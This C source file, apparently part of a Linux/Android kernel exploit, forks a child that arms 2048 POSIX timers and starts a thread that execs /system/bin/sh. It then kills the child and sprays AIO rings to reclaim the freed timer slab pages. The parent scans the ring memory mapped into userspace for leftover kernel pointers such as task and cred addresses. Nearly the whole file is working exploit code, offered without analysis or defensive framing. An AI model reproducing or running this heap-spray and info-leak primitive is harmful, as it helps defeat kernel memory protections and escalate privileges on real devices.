/*
 * aiospray - claim the freed timer slab page with an AIO ring and read the
 * residual kernel data back through the userspace mapping.
 *
 * The ring is mapped into our address space by io_setup(), so whatever the
 * kernel left in that page (freed k_itimer bytes: rbtree links, task/cred
 * pointers) becomes readable text. No reap is performed, so the dangling node
 * is never walked.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <pthread.h>
#include <stdint.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <linux/aio_abi.h>

#define KVA 0xffff000000000000ULL
#define CHILD_TIMERS 2048
#define RINGS 2048

static void noop(int s) { (void)s; }

struct lc { int fd; pid_t tid; };

static void *exec_thread(void *arg)
{
    char *argv[] = { (char *)"/system/bin/sh", (char *)"-c", (char *)"true", NULL };
    (void)arg;
    execve(argv[0], argv, NULL);
    return NULL;
}

int main(void)
{
    aio_context_t ctx[RINGS];
    int made = 0, i, hits = 0;
    pid_t child;
    int pipefd[2];

    printf("=== aio ring spray + residual read ===\n");
    printf("uid=%d\n", (int)getuid());

    if (pipe(pipefd) != 0) return 1;
    child = fork();
    if (child == 0) {
        struct lc c;
        pthread_t th;
        struct sigevent sev;
        struct itimerspec its;
        struct sigaction sa;
        static timer_t many[CHILD_TIMERS];
        int armed = 0;

        close(pipefd[0]);
        {
            int dn = open("/dev/null", O_WRONLY);   /* don't hold the shell's stdout */
            if (dn >= 0) { dup2(dn, 1); dup2(dn, 2); if (dn > 2) close(dn); }
        }
        memset(&sa, 0, sizeof(sa)); sa.sa_handler = noop; sigaction(SIGRTMIN, &sa, NULL);
        memset(&sev, 0, sizeof(sev));
        sev.sigev_notify = SIGEV_SIGNAL;
        sev.sigev_signo = SIGRTMIN;
        memset(&its, 0, sizeof(its));
        its.it_value.tv_nsec = 200000L;
        its.it_interval.tv_nsec = 200000L;
        for (i = 0; i < CHILD_TIMERS; i++) {
            if (timer_create(CLOCK_THREAD_CPUTIME_ID, &sev, &many[i]) != 0) break;
            if (timer_settime(many[i], 0, &its, NULL) != 0) break;
            armed++;
        }
        c.fd = pipefd[1];
        c.tid = (pid_t)syscall(SYS_gettid);
        (void)!write(pipefd[1], &armed, sizeof(armed));
        if (pthread_create(&th, NULL, exec_thread, &c) != 0) _exit(9);
        for (;;) pause();
    }

    close(pipefd[1]);
    {
        int armed = 0;
        if (read(pipefd[0], &armed, sizeof(armed)) != (ssize_t)sizeof(armed)) armed = -1;
        close(pipefd[0]);
        printf("child=%d timers_armed=%d\n", (int)child, armed);
    }

    usleep(2000);
    kill(child, SIGKILL);          /* exit_itimers frees the 2048 k_itimer objects */
    usleep(60000);                 /* let the slabs go back to buddy */

    for (i = 0; i < RINGS; i++) {
        aio_context_t c = 0;
        long rc = syscall(__NR_io_setup, 1, &c);
        if (rc != 0) break;
        ctx[made++] = c;
    }
    printf("aio rings: %d\n", made);

    /* scan the mapped rings for residual kernel pointers */
    for (i = 0; i < made && hits < 12; i++) {
        unsigned char *p = (unsigned char *)(uintptr_t)ctx[i];
        size_t off;
        if (p == NULL) continue;
        for (off = 0; off + 8 <= 4096; off += 8) {
            uint64_t v;
            memcpy(&v, p + off, 8);
            if (v >= KVA) {
                printf("  ring[%d] +0x%03zx = 0x%016llx\n", i, off, (unsigned long long)v);
                hits++;
            }
        }
    }
    if (!hits) printf("  no kernel pointers in the ring pages\n");

    for (i = 0; i < made; i++) syscall(__NR_io_destroy, ctx[i]);
    printf("rings destroyed\n");
    return 0;
}
